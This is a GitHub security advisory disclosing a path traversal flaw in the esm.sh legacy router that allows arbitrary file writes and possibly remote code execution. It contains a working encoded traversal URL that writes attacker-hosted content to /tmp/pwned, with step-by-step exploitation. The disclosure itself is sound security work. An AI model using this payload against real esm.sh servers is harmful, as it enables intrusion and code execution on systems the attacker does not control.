# [H] esm.sh: Legacy Route Path Traversal Can Lead to RCE

## Summary
Severity: High
Advisory: GHSA-3636-h3vx-6465
CVE: CVE-2026-44593
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-3636-h3vx-6465
Type: github-advisory

## Affected
- Go: `github.com/esm-dev/esm.sh` — affected >=0 <0.0.0-20260508100112-1960055e1d53

## Details
### Impact
- Arbitrary File Write – An attacker can cause the server to write data to any file path it has write permission for.
- Privilege Escalation / RCE – By overwriting critical binaries or scripts, the attacker can execute arbitrary code with the server’s privileges.

### Exploit

The legacy router first retrieves a response from `legacyServer`, parses the incoming request path, and ultimately writes the data to storage via `buildStorage.Put`  
(see <https://github.com/esm-dev/esm.sh/blob/4312ae93e518121e764a18bb521af12e490ef137/server/legacy_router.go#L291>).

For a URL such as:

```
http://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned
```

the router concatenates the path components without sanitizing them, producing a storage key like:

```
legacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned
```

When this key is used, the underlying file system resolves the relative segments and writes the file to `/tmp/pwned`. Thus an attacker can craft a request that writes data to arbitrary locations on the server.


### Details

1. **URL Construction**  
   A crafted request is sent to the server:
   ```
   http://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned
   ```

2. **Proxy to Legacy Server**  
   The request is forwarded to:
   ```
   http://legacy.esm.sh/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../tmp/pwned
   ```
   which resolves to:
   ```
   http://legacy.esm.sh/gh/<attacker>/exp@1171e85d5d/foo.md
   ```

3. **File Retrieval**  
   The server fetches `foo.md` from the GitHub repository `https://github.com/<attacker>/exp`.

4. **Path Normalisation & Storage**  
   The storage path derived from the request is:
   ```
   legacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned
   ```
   Normalising this path yields `/tmp/pwned`. The retrieved file content is then written to that location.

5. **Result**  
   By repeating this pattern, an attacker can overwrite arbitrary binaries or scripts on the server, paving the way for remote code execution.


### Credit Discovery To
splitline (@\_splitline\_) from DEVCORE Research Team

## References
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-3636-h3vx-6465
- https://nvd.nist.gov/vuln/detail/CVE-2026-44593
- https://github.com/esm-dev/esm.sh
- https://github.com/esm-dev/esm.sh/releases/tag/v137_3
